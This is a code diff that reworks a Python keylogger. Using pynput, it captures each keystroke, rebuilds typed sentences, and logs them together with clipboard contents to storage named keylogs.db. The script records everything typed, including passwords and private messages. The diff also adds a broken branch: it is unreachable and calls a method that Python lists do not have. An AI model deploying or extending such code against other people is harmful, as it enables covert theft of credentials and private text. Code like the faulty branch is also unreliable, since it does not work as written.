@@ -4,6 +4,7 @@ from pynput import keyboard
 import sqlite3
 import pyperclip
 from logData.logger import log_clipboard, log_sentence
+import re
 
 # Database setup
 DB_FILE = "keylogs.db"
@@ -62,12 +63,14 @@ modifier_keys = {
 def log_buffer():
     global buffer
     if buffer:
-        log_sentence("".join(buffer))
+        sentence = "".join(buffer)
+        sentence = re.sub(r"\s+", " ", sentence.replace("\n", " "))
+        log_sentence(sentence)
         buffer = []
 
 
-def on_release(key):
-    global buffer, last_time
+def on_press(key):
+    global buffer
     try:
         if key in modifier_keys:
             return  # Do not log modifier keys
@@ -75,22 +78,25 @@ def on_release(key):
         if hasattr(key, "char") and key.char is not None:
             buffer.append(key.char)
         elif key == keyboard.Key.enter:
-            log_buffer()
+            if buffer:
+                buffer.append("\n")
+                log_buffer()
         elif key == keyboard.Key.space:
             buffer.append(" ")
-            log_buffer()
         elif key == keyboard.Key.backspace:
             if buffer:
                 buffer.pop()
+        else:
+            if key in modifier_keys:  # Only add non-modifier keys to buffer
+                if buffer:
+                    buffer.discard(str(key))
+                    log_buffer()
 
-        # Log the buffer if a second has passed since the last keystroke
-        current_time = time.time()
-        if current_time - last_time > 1:
-            log_buffer()
-            last_time = current_time
     except Exception as e:
         print(f"Error logging keystroke: {e}")
 
+
+def on_release(key):
     try:
         clipboard_text = pyperclip.paste()
         if clipboard_text:
@@ -100,5 +106,5 @@ def on_release(key):
 
 
 # Start listening to keyboard events
-with keyboard.Listener(on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
